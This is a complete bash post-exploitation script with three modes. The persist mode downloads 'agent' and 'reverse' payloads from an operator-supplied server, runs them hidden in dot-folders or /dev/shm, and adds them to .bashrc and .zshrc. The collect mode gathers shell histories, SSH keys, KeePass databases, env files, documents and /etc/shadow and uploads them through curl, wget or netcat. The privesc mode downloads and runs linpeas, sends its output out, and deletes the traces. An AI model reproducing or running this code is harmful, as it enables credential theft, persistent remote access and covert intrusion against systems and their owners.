#!/usr/bin/env bash
set -euo pipefail

# Usage: ./script.sh <mode> <server_ip> [port]
# Modes: persist | privesc | collect | all

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <mode> <server_ip> [port]"
    echo "Modes: persist | privesc | collect | all"
    echo "Default port: 8080"
    exit 1
fi

MODE="$1"
SERVER_IP="$2"
UPLOAD_PORT="${3:-8080}" # Default to 8080 if not specified
HOSTNAME="$(hostname 2>/dev/null || true)"
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(hostnamectl --static 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(cat /etc/hostname 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="unknown"
fi
USERNAME="$(id -un)"

# Determine home directory safely
if [ -n "${HOME:-}" ]; then
    BASEDIR="$HOME"
else
    if [ "$USERNAME" = "root" ]; then
        BASEDIR="/root"
    else
        BASEDIR="/home/$USERNAME"
    fi
fi

WORKDIR="$BASEDIR/.local/.cache/.svc"
if mkdir -p "$WORKDIR" 2>/dev/null && cd "$WORKDIR"; then
    echo "[*] Using workdir: $WORKDIR"
else
    WORKDIR="/dev/shm/.svc"
    mkdir -p "$WORKDIR"
    cd "$WORKDIR"
    echo "[*] Falling back to workdir: $WORKDIR"
fi

# Function to handle file uploads with fallback methods
upload_file() {
    local file="$1"
    local custom_name="$2"

    # Method 1: Try curl
    if command -v curl >/dev/null 2>&1; then
        if curl -s -F "file=@$file;filename=$custom_name" "http://$SERVER_IP:$UPLOAD_PORT/p"; then
            echo "[+] Uploaded $file as $custom_name via curl"
            return 0
        else
            echo "[-] curl upload failed for $file"
        fi
    fi

    # Method 2: Try wget with POST (if server supports it)
    if command -v wget >/dev/null 2>&1; then
        # Create a temporary boundary and form data
        local boundary="----WebKitFormBoundary$(openssl rand -hex 8 2>/dev/null || date +%s)"
        local tmpfile="/tmp/.upload_$$"

        {
            echo "--$boundary"
            echo "Content-Disposition: form-data; name=\"file\"; filename=\"$custom_name\""
            echo "Content-Type: application/octet-stream"
            echo ""
            cat "$file"
            echo ""
            echo "--$boundary--"
        } >"$tmpfile" 2>/dev/null

        if wget -q --post-file="$tmpfile" \
            --header="Content-Type: multipart/form-data; boundary=$boundary" \
            "http://$SERVER_IP:$UPLOAD_PORT/p" -O /dev/null 2>/dev/null; then
            rm -f "$tmpfile"
            echo "[+] Uploaded $file as $custom_name via wget"
            return 0
        else
            rm -f "$tmpfile"
            echo "[-] wget upload failed for $file"
        fi
    fi

    # Method 3: Try nc (netcat) if available
    if command -v nc >/dev/null 2>&1 || command -v ncat >/dev/null 2>&1; then
        local nc_cmd="nc"
        command -v ncat >/dev/null 2>&1 && nc_cmd="ncat"

        # Try simple HTTP PUT request
        {
            echo "PUT /upload/$custom_name HTTP/1.1"
            echo "Host: $SERVER_IP:$UPLOAD_PORT"
            echo "Content-Length: $(stat -c%s "$file" 2>/dev/null || wc -c <"$file")"
            echo "Connection: close"
            echo ""
            cat "$file"
        } | $nc_cmd "$SERVER_IP" "$UPLOAD_PORT" >/dev/null 2>&1

        if [ $? -eq 0 ]; then
            echo "[+] Uploaded $file as $custom_name via netcat"
            return 0
        else
            echo "[-] netcat upload failed for $file"
        fi
    fi

    # Fallback: Copy to persistence directory if all upload methods fail
    local fallback_dir="$WORKDIR/collected"
    mkdir -p "$fallback_dir"
    if cp "$file" "$fallback_dir/$custom_name" 2>/dev/null; then
        echo "[!] No upload method available - saved $file to $fallback_dir/$custom_name"
        return 0
    else
        echo "[-] Failed to save $file locally"
        return 1
    fi
}

persist_mode() {
    echo "[*] Running persist mode in $WORKDIR"

    wget -q "http://$SERVER_IP/payloads/agent" -O agent || {
        echo "[-] Failed to download agent"
        return 1
    }
    wget -q "http://$SERVER_IP/payloads/reverse" -O reverse || {
        echo "[-] Failed to download reverse"
        return 1
    }
    chmod +x agent reverse

    # Use subshell to prevent exit on failure and properly background+disown
    (
        ./reverse >/dev/null 2>&1 &
        disown
    ) || echo "[-] Reverse failed"
    (
        ./agent >/dev/null 2>&1 &
        disown
    ) || echo "[-] Agent failed"

    echo "[*] Adding persistence to shell configs..."
    for rc in "$BASEDIR/.bashrc" "$BASEDIR/.zshrc"; do
        if [ -f "$rc" ]; then
            if ! grep -q "$WORKDIR/reverse" "$rc"; then
                echo "$WORKDIR/reverse &" >>"$rc"
            fi
            if ! grep -q "$WORKDIR/agent" "$rc"; then
                echo "$WORKDIR/agent &" >>"$rc"
            fi
        fi
    done

    echo "[+] Persistence components started and added to rc files."
}

collect_mode() {
    echo "[*] Running collect mode..."

    # Search both /home and /root (if accessible)
    for DIR in /home /root; do
        [ -d "$DIR" ] || continue
        find "$DIR" -type f \
            \( -name ".bash_history" -o -name ".zsh_history" \
            -o -name ".bashrc" -o -name ".zshrc" \
            -o -name ".bash_profile" -o -name ".zprofile" -o -name ".profile" \
            -o -name ".bash_aliases" -o -name ".zsh_aliases" \
            -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
            -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \
            -o -name "*.doc" -o -name "*.docx" -o -name "*.kdbx" \
            -o -name "id_*" -o -name "*env"-o -name "authorized_keys" \) \
            -print0 2>/dev/null || true
    done |
        while IFS= read -r -d '' f; do
            if [ -f "$f" ]; then
                OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo unknown)"
                BASENAME="$(basename "$f")"
                CUSTOM_NAME="${HOSTNAME}_${OWNER}_${BASENAME}"
                echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
                upload_file "$f" "$CUSTOM_NAME"
            fi
        done

    # Add shadow separately (not caught by find)
    if [ -r /etc/shadow ]; then
        f="/etc/shadow"
        OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo root)"
        CUSTOM_NAME="${HOSTNAME}_${OWNER}_shadow"
        echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
        upload_file "$f" "$CUSTOM_NAME"
    fi

    # Check if files were saved locally and notify
    if [ -d "$WORKDIR/collected" ]; then
        local file_count=$(find "$WORKDIR/collected" -type f 2>/dev/null | wc -l)
        if [ "$file_count" -gt 0 ]; then
            echo "[!] $file_count files saved locally in $WORKDIR/collected (upload failed)"
        fi
    fi

    echo "[+] Collection & exfiltration complete."
}

privesc_mode() {
    echo "[*] Running privesc mode in $WORKDIR"

    wget -q "http://$SERVER_IP/linpeas" -O linpeas || {
        echo "[-] Failed to download linpeas"
        exit 1
    }
    chmod +x linpeas

    trap 'echo "[*] linpeas interrupted, continuing..."' INT
    ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
    # timeout 600 ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
    trap - INT

    upload_file "${HOSTNAME}_${USERNAME}_linpeas.txt" "${HOSTNAME}_${USERNAME}_linpeas.txt"

    rm -f linpeas "${HOSTNAME}_${USERNAME}_linpeas.txt"
    echo "[+] Privesc scan completed and cleaned up."
}

case "$MODE" in
persist) persist_mode ;;
privesc) privesc_mode ;;
collect) collect_mode ;;
all)
    persist_mode || echo "[-] Persist mode had errors, continuing..."
    collect_mode || echo "[-] Collect mode had errors, continuing..."
    privesc_mode || echo "[-] Privesc mode had errors, continuing..."
    ;;
*)
    echo "Invalid mode: $MODE"
    echo "Valid modes: persist | privesc | collect | all"
    exit 1
    ;;
esac
